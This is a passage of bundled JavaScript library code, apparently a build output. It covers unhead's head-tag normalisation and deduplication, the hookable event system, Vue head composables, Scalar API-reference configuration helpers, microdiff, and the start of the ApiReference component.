	} else if (tag.tag === "style") weight = tag.innerHTML && ImportStyleRe.test(tag.innerHTML) ? weightMap.style.imported : weightMap.style.sync;
	return (weight || 100) + offset;
}
//#endregion
//#region node_modules/unhead/dist/shared/unhead.ylJpsHyA.mjs
function defineHeadPlugin(plugin) {
	return plugin;
}
var FlatMetaPlugin = /* @__PURE__ */ defineHeadPlugin({
	key: "flatMeta",
	hooks: { "entries:normalize": (ctx) => {
		const tagsToAdd = [];
		ctx.tags = ctx.tags.map((t) => {
			if (t.tag !== "_flatMeta") return t;
			tagsToAdd.push(unpackMeta(t.props).map((p) => ({
				...t,
				tag: "meta",
				props: p
			})));
			return false;
		}).filter(Boolean).concat(...tagsToAdd);
	} }
});
//#endregion
//#region node_modules/hookable/dist/index.mjs
function flatHooks(configHooks, hooks = {}, parentName) {
	for (const key in configHooks) {
		const subHook = configHooks[key];
		const name = parentName ? `${parentName}:${key}` : key;
		if (typeof subHook === "object" && subHook !== null) flatHooks(subHook, hooks, name);
		else if (typeof subHook === "function") hooks[name] = subHook;
	}
	return hooks;
}
var createTask = /* @__PURE__ */ (() => {
	if (console.createTask) return console.createTask;
	const defaultTask = { run: (fn) => fn() };
	return () => defaultTask;
})();
function callHooks(hooks, args, startIndex, task) {
	for (let i = startIndex; i < hooks.length; i += 1) try {
		const result = task ? task.run(() => hooks[i](...args)) : hooks[i](...args);
		if (result && typeof result.then === "function") return Promise.resolve(result).then(() => callHooks(hooks, args, i + 1, task));
	} catch (error) {
		return Promise.reject(error);
	}
}
function serialTaskCaller(hooks, args, name) {
	if (hooks.length > 0) return callHooks(hooks, args, 0, createTask(name));
}
function parallelTaskCaller(hooks, args, name) {
	if (hooks.length > 0) {
		const task = createTask(name);
		return Promise.all(hooks.map((hook) => task.run(() => hook(...args))));
	}
}
function callEachWith(callbacks, arg0) {
	for (const callback of [...callbacks]) callback(arg0);
}
var Hookable = class {
	_hooks;
	_before;
	_after;
	_deprecatedHooks;
	_deprecatedMessages;
	constructor() {
		this._hooks = {};
		this._before = void 0;
		this._after = void 0;
		this._deprecatedMessages = void 0;
		this._deprecatedHooks = {};
		this.hook = this.hook.bind(this);
		this.callHook = this.callHook.bind(this);
		this.callHookWith = this.callHookWith.bind(this);
	}
	hook(name, function_, options = {}) {
		if (!name || typeof function_ !== "function") return () => {};
		const originalName = name;
		let dep;
		while (this._deprecatedHooks[name]) {
			dep = this._deprecatedHooks[name];
			name = dep.to;
		}
		if (dep && !options.allowDeprecated) {
			let message = dep.message;
			if (!message) message = `${originalName} hook has been deprecated` + (dep.to ? `, please use ${dep.to}` : "");
			if (!this._deprecatedMessages) this._deprecatedMessages = /* @__PURE__ */ new Set();
			if (!this._deprecatedMessages.has(message)) {
				console.warn(message);
				this._deprecatedMessages.add(message);
			}
		}
		if (!function_.name) try {
			Object.defineProperty(function_, "name", {
				get: () => "_" + name.replace(/\W+/g, "_") + "_hook_cb",
				configurable: true
			});
		} catch {}
		this._hooks[name] = this._hooks[name] || [];
		this._hooks[name].push(function_);
		return () => {
			if (function_) {
				this.removeHook(name, function_);
				function_ = void 0;
			}
		};
	}
	hookOnce(name, function_) {
		let _unreg;
		let _function = (...arguments_) => {
			if (typeof _unreg === "function") _unreg();
			_unreg = void 0;
			_function = void 0;
			return function_(...arguments_);
		};
		_unreg = this.hook(name, _function);
		return _unreg;
	}
	removeHook(name, function_) {
		const hooks = this._hooks[name];
		if (hooks) {
			const index = hooks.indexOf(function_);
			if (index !== -1) hooks.splice(index, 1);
			if (hooks.length === 0) this._hooks[name] = void 0;
		}
	}
	clearHook(name) {
		this._hooks[name] = void 0;
	}
	deprecateHook(name, deprecated) {
		this._deprecatedHooks[name] = typeof deprecated === "string" ? { to: deprecated } : deprecated;
		const _hooks = this._hooks[name] || [];
		this._hooks[name] = void 0;
		for (const hook of _hooks) this.hook(name, hook);
	}
	deprecateHooks(deprecatedHooks) {
		for (const name in deprecatedHooks) this.deprecateHook(name, deprecatedHooks[name]);
	}
	addHooks(configHooks) {
		const hooks = flatHooks(configHooks);
		const removeFns = Object.keys(hooks).map((key) => this.hook(key, hooks[key]));
		return () => {
			for (const unreg of removeFns) unreg();
			removeFns.length = 0;
		};
	}
	removeHooks(configHooks) {
		const hooks = flatHooks(configHooks);
		for (const key in hooks) this.removeHook(key, hooks[key]);
	}
	removeAllHooks() {
		this._hooks = {};
	}
	callHook(name, ...args) {
		return this.callHookWith(serialTaskCaller, name, args);
	}
	callHookParallel(name, ...args) {
		return this.callHookWith(parallelTaskCaller, name, args);
	}
	callHookWith(caller, name, args) {
		const event = this._before || this._after ? {
			name,
			args,
			context: {}
		} : void 0;
		if (this._before) callEachWith(this._before, event);
		const result = caller(this._hooks[name] ? [...this._hooks[name]] : [], args, name);
		if (result instanceof Promise) return result.finally(() => {
			if (this._after && event) callEachWith(this._after, event);
		});
		if (this._after && event) callEachWith(this._after, event);
		return result;
	}
	beforeEach(function_) {
		this._before = this._before || [];
		this._before.push(function_);
		return () => {
			if (this._before !== void 0) {
				const index = this._before.indexOf(function_);
				if (index !== -1) this._before.splice(index, 1);
			}
		};
	}
	afterEach(function_) {
		this._after = this._after || [];
		this._after.push(function_);
		return () => {
			if (this._after !== void 0) {
				const index = this._after.indexOf(function_);
				if (index !== -1) this._after.splice(index, 1);
			}
		};
	}
};
function createHooks() {
	return new Hookable();
}
//#endregion
//#region node_modules/unhead/dist/shared/unhead.J7R8psSN.mjs
var allowedMetaProperties = [
	"name",
	"property",
	"http-equiv"
];
var StandardSingleMetaTags = /* @__PURE__ */ new Set([
	"viewport",
	"description",
	"keywords",
	"robots"
]);
function isMetaArrayDupeKey(v) {
	const i = v.indexOf(":");
	if (i === -1) return false;
	const j = v.indexOf(":", i + 1);
	const namespace = v.slice(i + 1, j === -1 ? v.length : j);
	if (namespace === "twitter") return v === "meta:twitter:image" || v.startsWith("meta:twitter:image:");
	return MetaTagsArrayable.has(namespace);
}
function dedupeKey(tag) {
	const { props, tag: name } = tag;
	if (UniqueTags.has(name)) return name;
	if (name === "link" && props.rel === "canonical") return "canonical";
	if (name === "link" && props.rel === "alternate") {
		if (props.hreflang) return `alternate:${props.hreflang}`;
		if (props.type) return `alternate:${props.type}:${props.href || ""}`;
	}
	if (props.charset) return "charset";
	if (tag.tag === "meta") {
		for (const n of allowedMetaProperties) if (props[n] !== void 0) {
			const propValue = props[n];
			const isStructured = propValue && typeof propValue === "string" && propValue.includes(":");
			const isStandardSingle = propValue && StandardSingleMetaTags.has(propValue);
			return `${name}:${propValue}${!(isStructured || isStandardSingle) && tag.key ? `:key:${tag.key}` : ""}`;
		}
	}
	if (tag.key) return `${name}:key:${tag.key}`;
	if (props.id) return `${name}:id:${props.id}`;
	if (name === "link" && props.rel === "alternate") return `alternate:${props.href || ""}`;
	if (TagsWithInnerContent.has(name)) {
		const v = tag.textContent || tag.innerHTML;
		if (v) return `${name}:content:${v}`;
	}
}
function hashTag(tag) {
	const dedupe = tag._h || tag._d;
	if (dedupe) return dedupe;
	const inner = tag.textContent || tag.innerHTML;
	if (inner) return inner;
	const keys = Object.keys(tag.props).sort();
	return `${tag.tag}:${keys.map((k) => `${k}:${String(tag.props[k])}`).join(",")}`;
}
function walkResolver(val, resolve, key) {
	if (typeof val === "function") {
		if (!key || key !== "titleTemplate" && !(key[0] === "o" && key[1] === "n")) val = val();
	}
	const v = resolve ? resolve(key, val) : val;
	if (Array.isArray(v)) {
		let out;
		for (let i = 0; i < v.length; i++) {
			const resolved = walkResolver(v[i], resolve);
			if (out) out[i] = resolved;
			else if (resolved !== v[i]) {
				out = v.slice(0, i);
				out[i] = resolved;
			}
		}
		return out || v;
	}
	if (v?.constructor === Object) {
		let next;
		for (const k in v) {
			const unsafe = /* @__PURE__ */ isUnsafeKey(k);
			const resolved = unsafe ? void 0 : walkResolver(v[k], resolve, k);
			if (!next && (unsafe || k === "_resolver" || resolved !== v[k])) {
				next = {};
				for (const previousKey in v) {
					if (previousKey === k) break;
					next[previousKey] = v[previousKey];
				}
			}
			if (next && !unsafe) next[k] = resolved;
		}
		return next || v;
	}
	return v;
}
var INVALID_ATTR_NAME_RE = /[\s"'<>/=\x00-\x1F\x7F]/;
function normalizeStyleClassProps(key, value) {
	const store = key === "style" ? /* @__PURE__ */ new Map() : /* @__PURE__ */ new Set();
	function processValue(rawValue) {
		if (rawValue == null || rawValue === void 0) return;
		const value2 = String(rawValue).trim();
		if (!value2) return;
		if (key === "style") {
			const [k, ...v] = value2.split(":").map((s) => s ? s.trim() : "");
			if (k && v.length) store.set(k, v.join(":"));
		} else value2.split(" ").filter(Boolean).forEach((c) => store.add(c));
	}
	if (typeof value === "string") key === "style" ? value.split(";").forEach(processValue) : processValue(value);
	else if (Array.isArray(value)) value.forEach((item) => processValue(item));
	else if (value && typeof value === "object") Object.entries(value).forEach(([k, v]) => {
		if (v && v !== "false") key === "style" ? store.set(String(k).trim(), String(v)) : processValue(k);
	});
	return store;
}
function normalizeProps(tag, input) {
	tag.props = tag.props || {};
	if (!input) return tag;
	if (tag.tag === "templateParams") {
		tag.props = input;
		return tag;
	}
	const isHtmlTag = HasElementTags.has(tag.tag) || tag.tag === "htmlAttrs" || tag.tag === "bodyAttrs";
	for (const prop of Object.keys(input)) {
		if (/* @__PURE__ */ isUnsafeKey(prop)) continue;
		const isDataKey = prop.startsWith("data-");
		const isHtmlAttr = isHtmlTag && !TagConfigKeys.has(prop);
		const key = isHtmlAttr && !isDataKey ? prop.toLowerCase() : prop;
		if (isHtmlAttr && (!key || INVALID_ATTR_NAME_RE.test(key))) continue;
		const value = input[prop];
		if (value === null) {
			tag.props[key] = null;
			continue;
		}
		if (prop === "class" || prop === "style") {
			tag.props[prop] = normalizeStyleClassProps(prop, value);
			continue;
		}
		if (TagConfigKeys.has(prop)) {
			if ((prop === "textContent" || prop === "innerHTML") && typeof value === "object") {
				let type = input.type;
				if (!input.type) type = "application/json";
				if (!type?.endsWith("json") && type !== "speculationrules") continue;
				input.type = type;
				tag.props.type = type;
				tag[prop] = JSON.stringify(value);
			} else tag[prop] = value;
			continue;
		}
		const strValue = String(value);
		const isMetaContentKey = tag.tag === "meta" && key === "content";
		if (strValue === "true" || strValue === "") tag.props[key] = isDataKey || isMetaContentKey ? strValue : true;
		else if (!value && isDataKey && strValue === "false") tag.props[key] = "false";
		else if (value !== void 0) tag.props[key] = value;
	}
	return tag;
}
function normalizeTag(tagName, _input) {
	const tag = normalizeProps({
		tag: tagName,
		props: {}
	}, typeof _input === "object" && typeof _input !== "function" ? _input : { [tagName === "script" || tagName === "noscript" || tagName === "style" ? "innerHTML" : "textContent"]: _input });
	if (tag.key && DupeableTags.has(tag.tag)) tag.props["data-hid"] = tag._h = tag.key;
	if (tag.tag === "script" && typeof tag.innerHTML === "object") {
		tag.innerHTML = JSON.stringify(tag.innerHTML);
		tag.props.type = tag.props.type || "application/json";
	}
	return Array.isArray(tag.props.content) ? tag.props.content.map((v) => ({
		...tag,
		props: {
			...tag.props,
			content: v
		}
	})) : tag;
}
function normalizeEntryToTags(input, propResolvers) {
	if (!input) return [];
	if (typeof input === "function") input = input();
	const resolvers = (key, val) => {
		for (let i = 0; i < propResolvers.length; i++) val = propResolvers[i](key, val);
		return val;
	};
	input = resolvers(void 0, input);
	const tags = [];
	input = walkResolver(input, resolvers);
	Object.entries(input || {}).forEach(([key, value]) => {
		if (value === void 0) return;
		for (const v of Array.isArray(value) ? value : [value]) tags.push(normalizeTag(key, v));
	});
	return tags.flat();
}
//#endregion
//#region node_modules/unhead/dist/shared/unhead.BrXkGDAU.mjs
function registerPlugin(head, p) {
	const plugin = typeof p === "function" ? p(head) : p;
	const key = plugin.key || String(head.plugins.size + 1);
	if (!head.plugins.get(key)) {
		head.plugins.set(key, plugin);
		head.hooks.addHooks(plugin.hooks || {});
	}
}
// @__NO_SIDE_EFFECTS__
function createUnhead(resolvedOptions = {}) {
	const hooks = createHooks();
	hooks.addHooks(resolvedOptions.hooks || {});
	const ssr = !resolvedOptions.document;
	const entries = /* @__PURE__ */ new Map();
	const plugins = /* @__PURE__ */ new Map();
	const normalizeQueue = /* @__PURE__ */ new Set();
	const head = {
		_entryCount: 1,
		plugins,
		dirty: false,
		resolvedOptions,
		hooks,
		ssr,
		entries,
		headEntries() {
			return [...entries.values()];
		},
		use: (p) => registerPlugin(head, p),
		push(input, _options) {
			const options = { ..._options || {} };
			delete options.head;
			const _i = options._index ?? head._entryCount++;
			const inst = {
				_i,
				input,
				options
			};
			const _ = {
				_poll(rm = false) {
					head.dirty = true;
					!rm && normalizeQueue.add(_i);
					hooks.callHook("entries:updated", head);
				},
				dispose() {
					if (entries.delete(_i)) head.invalidate();
				},
				patch(input2) {
					if (!options.mode || options.mode === "server" && ssr || options.mode === "client" && !ssr) {
						inst.input = input2;
						entries.set(_i, inst);
						_._poll();
					}
				}
			};
			_.patch(input);
			return _;
		},
		async resolveTags() {
			const ctx = {
				tagMap: /* @__PURE__ */ new Map(),
				tags: [],
				entries: [...head.entries.values()]
			};
			await hooks.callHook("entries:resolve", ctx);
			while (normalizeQueue.size) {
				const i = normalizeQueue.values().next().value;
				normalizeQueue.delete(i);
				const e = entries.get(i);
				if (e) {
					const normalizeCtx = {
						tags: normalizeEntryToTags(e.input, resolvedOptions.propResolvers || []).map((t) => Object.assign(t, e.options)),
						entry: e
					};
					await hooks.callHook("entries:normalize", normalizeCtx);
					e._tags = normalizeCtx.tags.map((t, i2) => {
						t._w = tagWeight(head, t);
						t._p = (e._i << 10) + i2;
						t._d = dedupeKey(t);
						if (!t._d) t._h = hashTag(t);
						return t;
					});
				}
			}
			let hasFlatMeta = false;
			ctx.entries.flatMap((e) => (e._tags || []).map((t) => ({
				...t,
				props: { ...t.props }
			}))).sort(sortTags).reduce((acc, next) => {
				const k = next._d || next._h;
				if (!acc.has(k)) return acc.set(k, next);
				const prev = acc.get(k);
				if ((next?.tagDuplicateStrategy || (UsesMergeStrategy.has(next.tag) ? "merge" : null) || (next.key && next.key === prev.key ? "merge" : null)) === "merge") {
					const newProps = { ...prev.props };
					Object.entries(next.props).forEach(([p, v]) => newProps[p] = p === "style" ? new Map([...prev.props.style || /* @__PURE__ */ new Map(), ...v]) : p === "class" ? /* @__PURE__ */ new Set([...prev.props.class || /* @__PURE__ */ new Set(), ...v]) : v);
					acc.set(k, {
						...next,
						props: newProps
					});
				} else if (next._p >> 10 === prev._p >> 10 && next.tag === "meta" && isMetaArrayDupeKey(k)) {
					acc.set(k, Object.assign([...Array.isArray(prev) ? prev : [prev], next], next));
					hasFlatMeta = true;
				} else if (next._w === prev._w ? next._p > prev._p : next?._w < prev?._w) acc.set(k, next);
				return acc;
			}, ctx.tagMap);
			const title = ctx.tagMap.get("title");
			const titleTemplate = ctx.tagMap.get("titleTemplate");
			head._title = title?.textContent;
			if (titleTemplate) {
				const titleTemplateFn = titleTemplate?.textContent;
				head._titleTemplate = titleTemplateFn;
				if (titleTemplateFn) {
					let newTitle = typeof titleTemplateFn === "function" ? titleTemplateFn(title?.textContent) : titleTemplateFn;
					if (typeof newTitle === "string" && !head.plugins.has("template-params")) newTitle = newTitle.replace("%s", title?.textContent || "");
					if (title) newTitle === null ? ctx.tagMap.delete("title") : ctx.tagMap.set("title", {
						...title,
						textContent: newTitle
					});
					else {
						titleTemplate.tag = "title";
						titleTemplate.textContent = newTitle;
					}
				}
			}
			ctx.tags = Array.from(ctx.tagMap.values());
			if (hasFlatMeta) ctx.tags = ctx.tags.flat().sort(sortTags);
			await hooks.callHook("tags:beforeResolve", ctx);
			await hooks.callHook("tags:resolve", ctx);
			await hooks.callHook("tags:afterResolve", ctx);
			const finalTags = [];
			for (const t of ctx.tags) {
				const { innerHTML, tag, props } = t;
				if (!ValidHeadTags.has(tag)) continue;
				if (Object.keys(props).length === 0 && !hasContent(t.innerHTML) && !hasContent(t.textContent)) continue;
				if (tag === "meta") {
					if (!hasContent(props.content) && !props["http-equiv"] && !props.charset) continue;
				}
				if (tag === "script" && innerHTML) {
					if (String(props.type).endsWith("json")) t.innerHTML = (typeof innerHTML === "string" ? innerHTML : JSON.stringify(innerHTML)).replace(/</g, "\\u003C");
					else if (typeof innerHTML === "string") t.innerHTML = innerHTML.replace(new RegExp(`</${tag}`, "g"), `<\\/${tag}`);
					t._d = dedupeKey(t);
				}
				finalTags.push(t);
			}
			return finalTags;
		},
		invalidate() {
			for (const entry of entries.values()) normalizeQueue.add(entry._i);
			head.dirty = true;
			hooks.callHook("entries:updated", head);
		}
	};
	(resolvedOptions?.plugins || []).forEach((p) => registerPlugin(head, p));
	head.hooks.callHook("init", head);
	resolvedOptions.init?.forEach((e) => e && head.push(e));
	return head;
}
//#endregion
//#region node_modules/@unhead/vue/dist/shared/vue.N9zWjxoK.mjs
var VueResolver = (_, value) => {
	return isRef(value) ? toValue(value) : value;
};
//#endregion
//#region node_modules/@unhead/vue/dist/shared/vue.Cd6dkybA.mjs
var headSymbol = "usehead";
// @__NO_SIDE_EFFECTS__
function vueInstall(head) {
	return { install(app) {
		app.config.globalProperties.$unhead = head;
		app.config.globalProperties.$head = head;
		app.provide(headSymbol, head);
	} }.install;
}
// @__NO_SIDE_EFFECTS__
function injectHead() {
	if (hasInjectionContext()) {
		const instance = inject(headSymbol);
		if (instance) return instance;
	}
	throw new Error("useHead() was called without provide context, ensure you call it through the setup() function.");
}
function useHead(input, options = {}) {
	const head = options.head || /* @__PURE__ */ injectHead();
	return head.ssr ? head.push(input || {}, options) : clientUseHead(head, input, options);
}
function clientUseHead(head, input, options = {}) {
	const scope = getCurrentScope();
	if (scope && !scope.active) return {
		patch() {},
		dispose() {},
		_poll() {}
	};
	const deactivated = ref(false);
	let entry;
	watchEffect(() => {
		const i = deactivated.value ? {} : walkResolver(input, VueResolver);
		if (entry) entry.patch(i);
		else entry = head.push(i, options);
	});
	if (getCurrentInstance()) {
		onBeforeUnmount(() => {
			entry.dispose();
		});
		onDeactivated(() => {
			deactivated.value = true;
		});
		onActivated(() => {
			deactivated.value = false;
		});
	}
	return entry;
}
function useSeoMeta(input = {}, options = {}) {
	(options.head || /* @__PURE__ */ injectHead()).use(FlatMetaPlugin);
	const entry = useHead(normalizeSeoMetaInput(input), options);
	const corePatch = entry.patch;
	entry.patch = (input2) => corePatch(normalizeSeoMetaInput(input2));
	return entry;
}
function normalizeSeoMetaInput(input) {
	if (input._flatMeta) return input;
	const meta = {};
	for (const key in input) {
		if (!Object.prototype.hasOwnProperty.call(input, key) || key === "title" || key === "titleTemplate") continue;
		meta[key] = input[key];
	}
	return {
		title: input.title,
		titleTemplate: input.titleTemplate,
		_flatMeta: meta
	};
}
//#endregion
//#region node_modules/@scalar/api-reference/dist/helpers/map-config-to-workspace-store.js
var mapConfigToWorkspaceStore = ({ config, store, isDarkMode }) => {
	watch(() => toValue(config).defaultHttpClient, (newValue) => {
		if (newValue) {
			const { targetKey, clientKey } = newValue;
			const clientId = `${targetKey}/${clientKey}`;
			if (n$2(clientId)) store.update("x-scalar-default-client", clientId);
		}
	}, { immediate: true });
	/** Update the dark mode state when props change */
	watch(() => toValue(config).darkMode, (isDark) => store.update("x-scalar-color-mode", isDark ? "dark" : "light"));
	watch(() => isDarkMode.value, (newIsDark) => store.update("x-scalar-color-mode", newIsDark ? "dark" : "light"), { immediate: true });
	if (toValue(config).metaData) useSeoMeta(toValue(config).metaData);
	watch(() => toValue(config).proxyUrl, (newProxyUrl) => store.update("x-scalar-active-proxy", newProxyUrl), { immediate: true });
	useFavicon(computed(() => toValue(config).favicon));
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/helpers/normalize-configurations.js
var isConfigWithRequiredSource = (input) => {
	return !!input.url?.trim() || !!input.content;
};
/**
* Take any configuration and return a flat array of configurations.
*/
var normalizeConfigurations = (configuration) => {
	const { slug } = slugger();
	const normalized = {};
	if (!configuration) return normalized;
	(Array.isArray(configuration) ? configuration : [configuration]).flatMap((c) => {
		if (isConfigurationWithSources(c)) {
			const { sources: configSources, ...rest } = c;
			return configSources?.map((source) => ({
				...rest,
				...source
			})) ?? [];
		}
		return [c];
	}).map((source) => apiReferenceConfigurationWithSourceSchema(source)).filter(isConfigWithRequiredSource).map((source, index) => addSlugAndTitle(source, index, slug)).forEach((c) => {
		const { url, content, ...config } = c;
		normalized[c.slug] = {
			config,
			title: c.title,
			slug: c.slug,
			default: !!c?.default,
			agent: c.agent,
			source: content ? { content: normalizeContent(content) ?? {} } : { url }
		};
	});
	return normalized;
};
/** Normalize content into a JS object or return null if it is falsey */
var normalizeContent = (content) => {
	if (!content) return null;
	if (typeof content === "function") return normalizeContent(content());
	if (typeof content === "string") return parseJsonOrYaml(content);
	return content;
};
/** Process a single spec configuration so that it has a title and a slug */
var addSlugAndTitle = (source, index = 0, slug) => {
	if (source.title) return {
		...source,
		slug: source.slug || slug(source.title),
		title: source.title
	};
	if (source.slug) return {
		...source,
		slug: slug(source.slug),
		title: source.slug
	};
	return {
		...source,
		slug: `api-${index + 1}`,
		title: `API #${index + 1}`
	};
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/helpers/resolve-intersecting-entry.js
/**
* The navigation entry an intersecting section resolves to.
*
* The sentinel at the start of the document and every heading below it have their own
* `IntersectionObserver`, and the browser delivers their first records in no fixed order, so taking
* the last one leaves whichever heading happened to arrive last selected. Resolve it from position
* instead: while the sentinel is still at or below the top of the viewport, nothing above the start
* of the document has been scrolled past, so every section resolves to the document start. That
* covers the sections a short document shows all at once, and the ones of a document swapped in
* under the reader — the sentinel and the introduction sit in the same place across a swap, so
* their observers have no new record to report. A single pixel of scroll takes the sentinel's top
* negative and this is inert.
*/
var resolveIntersectingEntry = ({ id, documentStartId, documentStartTop }) => documentStartTop !== void 0 && documentStartTop >= 0 ? documentStartId : id;
//#endregion
//#region node_modules/@scalar/api-reference/dist/helpers/safe-deep-clone.js
/**
* Deep-clones plain data for use where mutation must not affect the source.
*
* In the browser we use `structuredClone`, which preserves `Date`, `Map`, `Set`,
* typed arrays, and other structured types. During SSR there is no `window`, so
* we fall back to `JSON.parse(JSON.stringify(...))`, which only supports JSON
* values (functions, `undefined` in objects, symbols, etc. are dropped or altered).
*
* @example
* ```ts
* const copy = safeDeepClone(spec)
* copy.info.title = 'Draft'
* // original spec is unchanged
* ```
*/
var safeDeepClone = (value) => {
	if (typeof window === "undefined") return deepClone(value);
	return window.structuredClone(value);
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/helpers/use-document-environment.js
/** Apply document environment defaults to an embedded store without replacing user selections. */
var useDocumentEnvironment = (store) => {
	const selection = {
		applyingDefault: false,
		hasUserOverride: store.workspace["x-scalar-active-environment"] !== void 0
	};
	watch(() => store.workspace["x-scalar-active-environment"], () => {
		if (!selection.applyingDefault) selection.hasUserOverride = true;
	}, { flush: "sync" });
	watch(() => {
		const document = store.workspace.activeDocument;
		return [document, isOpenApiDocument(document) ? document["x-scalar-active-environment"] ?? Object.keys(document["x-scalar-environments"] ?? {})[0] : void 0];
	}, ([, environment]) => {
		if (selection.hasUserOverride) return;
		selection.applyingDefault = true;
		try {
			store.update("x-scalar-active-environment", environment);
		} finally {
			selection.applyingDefault = false;
		}
	}, {
		immediate: true,
		flush: "sync"
	});
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/hooks/use-configured-servers.js
/** Keep configured servers in the client document so variable edits target the displayed servers. */
var useConfiguredServers = ({ configurations, sourceStore, clientStore }) => {
	watch(() => Object.values(toValue(configurations)).map(({ slug, config }) => ({
		slug,
		servers: deepClone(config.servers),
		document: clientStore.workspace.documents[slug]
	})), (entries, previousEntries = []) => {
		for (const { slug, servers, document } of entries) {
			if (!isOpenApiDocument(document)) continue;
			const previous = previousEntries.find((entry) => entry.slug === slug);
			if (previous?.document === document && isObjectEqual(previous.servers, servers)) continue;
			if (servers !== void 0) document.servers = deepClone(servers);
			else if (previous?.servers !== void 0) {
				const source = sourceStore.workspace.documents[slug];
				document.servers = isOpenApiDocument(source) ? deepClone(source.servers) : void 0;
			}
		}
	}, {
		immediate: true,
		flush: "sync"
	});
};
//#endregion
//#region node_modules/@scalar/helpers/dist/object/to-json-compatible.js
/**
* Traverses an object or array, returning a deep copy in which circular references are replaced
* by JSON Reference objects of the form: `{ $ref: "#/path/to/original" }`.
* This allows safe serialization of objects with cycles, following the JSON Reference convention (RFC 6901).
* An optional `prefix` for the `$ref` path can be provided via options.
*
* @param obj - The input object or array to process
* @param options - Optional configuration; you can set a prefix for $ref pointers
* @returns A new object or array, with all circular references replaced by $ref pointers
*/
var toJsonCompatible = (obj, options = {}) => {
	const { prefix = "", cache = /* @__PURE__ */ new WeakMap() } = options;
	const toRef = (path) => ({ $ref: `#${path ?? ""}` });
	if (typeof obj !== "object" || obj === null) return obj;
	const rootPath = prefix;
	cache.set(obj, rootPath);
	const rootResult = Array.isArray(obj) ? new Array(obj.length) : {};
	const queue = new Queue();
	queue.enqueue({
		node: obj,
		result: rootResult,
		path: rootPath
	});
	while (!queue.isEmpty()) {
		const frame = queue.dequeue();
		if (!frame) continue;
		const { node, result, path } = frame;
		if (Array.isArray(node)) {
			const input = node;
			const out = result;
			for (let index = 0; index < input.length; index++) {
				if (!(index in input)) continue;
				const item = input[index];
				const itemPath = `${path}/${index}`;
				if (typeof item !== "object" || item === null) {
					out[index] = item;
					continue;
				}
				const existingPath = cache.get(item);
				if (existingPath !== void 0) {
					out[index] = toRef(existingPath);
					continue;
				}
				cache.set(item, itemPath);
				const childResult = Array.isArray(item) ? new Array(item.length) : {};
				out[index] = childResult;
				queue.enqueue({
					node: item,
					result: childResult,
					path: itemPath
				});
			}
			continue;
		}
		const out = result;
		const entries = Object.entries(node);
		for (const [key, value] of entries) {
			const valuePath = `${path}/${escapeJsonPointer(key)}`;
			if (typeof value !== "object" || value === null) {
				out[key] = value;
				continue;
			}
			const existingPath = cache.get(value);
			if (existingPath !== void 0) {
				out[key] = toRef(existingPath);
				continue;
			}
			cache.set(value, valuePath);
			const childResult = Array.isArray(value) ? new Array(value.length) : {};
			out[key] = childResult;
			queue.enqueue({
				node: value,
				result: childResult,
				path: valuePath
			});
		}
	}
	return rootResult;
};
//#endregion
//#region node_modules/microdiff/dist/index.js
var richTypes = [
	"Date",
	"RegExp",
	"String",
	"Number"
];
var temporalTypes = Object.getOwnPropertyNames(globalThis.Temporal || {});
function diff(obj, newObj, options = { cyclesFix: true }, _stack = []) {
	let diffs = [];
	const isObjArray = Array.isArray(obj);
	for (const key in obj) {
		const value = obj[key];
		const path = isObjArray ? +key : key;
		if (!(key in newObj)) {
			diffs.push({
				type: "REMOVE",
				path: [path],
				oldValue: value
			});
			continue;
		}
		const newValue = newObj[key];
		const areCompatibleObjects = typeof value === "object" && typeof newValue === "object" && Array.isArray(value) === Array.isArray(newValue);
		const objConstructor = areCompatibleObjects && value ? Object.getPrototypeOf(value)?.constructor?.name : void 0;
		if (value && newValue && areCompatibleObjects && !richTypes.includes(objConstructor) && !temporalTypes.includes(objConstructor) && (!options.cyclesFix || !_stack.includes(value))) {
			if (options.cyclesFix) _stack.push(value);
			const subDiffs = diff(value, newValue, options, _stack);
			if (options.cyclesFix) _stack.pop();
			for (const subDiff of subDiffs) {
				subDiff.path.unshift(path);
				diffs.push(subDiff);
			}
		} else if (!(Object.is(value, newValue) || temporalTypes.includes(objConstructor) && String(value) === String(newValue) || richTypes.includes(objConstructor) && (isNaN(value) ? value + "" === newValue + "" : +value === +newValue))) diffs.push({
			path: [path],
			type: "CHANGE",
			value: newValue,
			oldValue: value
		});
	}
	const isNewObjArray = Array.isArray(newObj);
	for (const key in newObj) if (!(key in obj)) diffs.push({
		type: "CREATE",
		path: [isNewObjArray ? +key : key],
		value: newObj[key]
	});
	return diffs;
}
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/ApiReference.vue.script.js
var _hoisted_1 = ["dir", "lang"];
var _hoisted_2 = {
	key: 1,
	class: "flex gap-1.5 px-3 pt-3"
};
var _hoisted_3 = {
	class: "no-underline hover:underline",
	href: "https://www.scalar.com",
	rel: "noopener noreferrer",
	target: "_blank"
};
var _hoisted_4 = { key: 1 };
var _hoisted_5 = ["aria-label", "inert"];
var _hoisted_6 = { class: "w-64 empty:hidden" };
var _hoisted_7 = {
	key: 3,
	class: "references-footer"
};
var _hoisted_8 = ["role"];
var version = "1.72.1";
if (typeof window !== "undefined") console.info(`@scalar/api-reference@${version}`);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/ApiReference.vue.js
var ApiReference_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "ApiReference",
	props: { configuration: {} },
	setup(__props, { expose: __expose }) {
		const props = __props;
		const { copyToClipboard } = useClipboard();
		/**
		* Used to inject the environment into built packages
		*
		* Primary use case is the open-in-client button
		*/
		const isDevelopment = false;
		/**
		* Whether scrollbars take up screen real estate.
		*
		* This defaults to `false` so the first client render matches the server (where
		* there is no DOM to measure). The real value is resolved in `onMounted` to
		* avoid a hydration mismatch on the root class.
		*/
		const obtrusiveScrollbars = ref(false);
		onMounted(() => {
			obtrusiveScrollbars.value = hasObtrusiveScrollbars();
		});
		const eventBus = createWorkspaceEventBus({ debug: isDevelopment });
		const isSidebarOpen = ref(false);
		/**
		* Due to a bug in headless UI, we need to set an ID here that can be shared across server/client
		* TODO remove this once the bug is fixed
		*
		* @see https://github.com/tailwindlabs/headlessui/issues/2979
		*/
		s$1(() => useId());
		/**
		* Which schema properties are open, for this reference only.
		*
		* Deliberately per-instance rather than module-global: `createApiReference` can
		* be called twice on one page, and two references must not share expansion.
		*/
		provideSchemaExpansion();
		/**
		* Configuration Handling
		*
		* We will normalize the configurations and store them in a computed property.
		* The active configuration will be associated with the active document.
